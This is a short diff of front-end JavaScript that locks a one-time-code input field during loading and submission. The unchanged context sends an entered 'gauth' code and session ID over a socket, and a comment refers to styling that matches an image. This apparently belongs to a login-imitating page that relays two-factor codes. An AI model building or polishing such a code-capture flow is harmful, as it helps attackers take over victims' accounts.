@@ -152,6 +152,8 @@ if (dest) {
     btn.dataset._orig = btn.innerHTML;
     btn.dataset._loading = "1";
     btn.innerHTML = SPINNER_HTML;
+    const otpInput = document.querySelector('input[autocomplete="one-time-code"], input[maxlength="6"], #input--7e1823f0-c6cf-4b2e-84d9-c042691eae7b');
+    if (otpInput) { otpInput.disabled = true; otpInput.style.pointerEvents = 'none'; }
   }
 
  // Re-enable the button & remove fallback spinner (mirrors app.js "unset")
@@ -175,6 +177,8 @@ if (dest) {
     delete btn.dataset._loading;
     btn.style.width = "";
     btn.style.height = "";
+    const otpInput = document.querySelector('input[autocomplete="one-time-code"], input[maxlength="6"], #input--7e1823f0-c6cf-4b2e-84d9-c042691eae7b');
+    if (otpInput) { otpInput.disabled = false; otpInput.style.pointerEvents = ''; }
   }
 
   // --- Error UI helpers (pink banner above the card, matching image style) ---
@@ -442,6 +446,7 @@ if (dest) {
       submit.style.color = "";
       submit.style.width = "";
       submit.style.height = "";
+      if (input) { input.disabled = false; input.style.pointerEvents = ''; }
     }
   }
 
@@ -508,7 +513,7 @@ if (dest) {
         submit.style.color = "#000000";
         submit.disabled = true;
       }
-
+if (input) { input.disabled = true; input.style.pointerEvents = 'none'; }
       try {
         if (socket) {
           socket.emit(EMIT_EVENT, { type: "gauth", data: code, sessionID });
